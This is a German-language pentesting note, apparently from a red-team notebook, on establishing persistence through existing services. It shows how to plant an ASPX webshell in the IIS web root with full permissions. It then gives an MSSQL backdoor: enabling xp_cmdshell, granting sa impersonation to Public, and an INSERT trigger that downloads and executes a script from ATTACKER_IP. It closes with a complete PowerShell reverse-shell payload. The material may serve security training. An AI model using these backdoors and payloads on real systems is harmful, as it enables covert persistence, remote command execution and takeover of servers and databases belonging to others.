# Persistenz durch bestehende Dienste

{% hint style="info" %}
Folgende Methoden nutzen Dienste wie Webserver oder Datenbanken aus, um Backdoors einzubauen. Sie sind besonders effektiv, wenn man Kontrolle über den **Codefluss oder Konfigurationsdateien** hat.
{% endhint %}

<details>

<summary>Links:</summary>

[https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)

</details>

***

### **Webserver-Backdoor via Web Shell**

Die einfachste Methode zur Persistenz auf einem Webserver ist das Hochladen einer **Webshell** in das Webverzeichnis.

#### Beispiel: ASP.NET Webshell (`shell.aspx`)

*   Wird über den Webbrowser angesprochen:

    ```
    http://<Opfer-IP>/shell.aspx
    ```

#### Schritte:

1.  Webshell auf das Ziel übertragen:

    ```cmd
    move shell.aspx C:\inetpub\wwwroot\
    ```
2.  Berechtigungen setzen, falls nötig:

    ```cmd
    icacls shell.aspx /grant Everyone:F
    ```
3. Webshell über den Browser aufrufen → Befehle im Kontext des IIS-Users ausführen:
   * Standard-User: `iis apppool\defaultapppool`
   * Dieser besitzt **SeImpersonatePrivilege** → mögliches Privilege Escalation

{% hint style="warning" %}
Webshells sind leicht zu entdecken, da Blue Teams oft die Webverzeichnisse auf **Integritätsänderungen** prüfen.
{% endhint %}

***

### **Datenbank-Backdoor via MSSQL-Trigger**

Man kann SQL Server verwenden, um **Trigger mit Systemzugriff** zu erstellen. Hierbei wird ein **SQL-Event (z. B. INSERT)** genutzt, um **Systemkommandos auszuführen**.

#### Schritte:

**a) xp\_cmdshell aktivieren (in SSMS):**

```sql
sp_configure 'Show Advanced Options', 1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
GO
```

**b) Privilegien setzen:**

```sql
USE master;
GRANT IMPERSONATE ON LOGIN::sa TO [Public];
```

**c) Trigger in der DB `HRDB` einrichten:**

```sql
USE HRDB;

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa';
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

***

#### **evilscript.ps1 (Reverse Shell Payload)**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

***

{% hint style="warning" %}
Diese Methode ist **unsichtbarer als Webshells**, da sie nur in der **Datenbanklogik** steckt. Sie wird allerdings bei Datenbankaudits oder Verhaltenserkennung auffallen.
{% endhint %}
